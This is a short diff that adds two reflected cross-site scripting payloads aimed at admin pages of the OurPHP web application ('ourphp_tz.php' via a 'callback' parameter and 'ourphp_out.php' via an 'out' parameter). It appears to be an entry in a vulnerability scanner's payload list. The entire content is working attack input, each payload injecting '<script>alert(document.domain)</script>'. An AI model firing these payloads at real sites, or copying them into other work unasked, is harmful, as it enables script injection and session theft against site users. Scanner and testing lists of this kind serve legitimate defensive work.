@@ -1,0 +1,2 @@
+/client/manage/ourphp_tz.php?act=rt&callback=<script>alert(document.domain)</script>
+/client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(document.domain)</script>
